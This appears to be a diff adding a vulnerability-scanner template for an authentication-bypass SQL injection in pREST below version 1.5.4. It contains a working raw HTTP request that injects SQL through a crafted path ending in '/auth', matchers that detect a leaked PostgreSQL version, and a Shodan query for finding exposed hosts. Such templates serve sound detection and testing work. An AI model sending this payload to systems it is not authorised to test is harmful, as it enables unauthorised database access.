@@ -1,0 +1,37 @@
+id: prest-sqli-auth-bypass
+
+info:
+  name: pREST < 1.5.4 - SQL Injection Via Authentication Bypass
+  author: mihail8531,iamnoooob,rootxharsh,pdresearch
+  severity: critical
+  description: |
+    An authentication bypass vulnerability was introduced by changing the JWT whitelist configuration to use a regex pattern, allowing unauthorized access to any path containing /auth and leading to SQL Injection.
+  reference:
+    - https://github.com/advisories/GHSA-wm25-j4gw-6vr3
+  metadata:
+    verified: true
+    max-request: 1
+    shodan-query: html:"authorization token is empty"
+  tags: sqli,prest,auth-bypass,sqli
+
+variables:
+  database: "{{database}}"
+
+http:
+  - raw:
+      - |
+        GET /{{database}}/information_schema".tables)s%20where%201=version()::int--/auth HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'pq: invalid input syntax for type integer: \"PostgreSQL '
+
+      - type: word
+        part: content_type
+        words:
+          - 'application/json'
+# digest: 4a0a004730450221009143ad300b8583bb40eefed3c3f8163c8d24be389375dc025765d9d2b158a2a702200ca75d957235192bca74b0c1f9675a7c789d49ae6ec7b8d8af1c1741e2bc73e4:922c64590222798bb761d5b6d8e72950
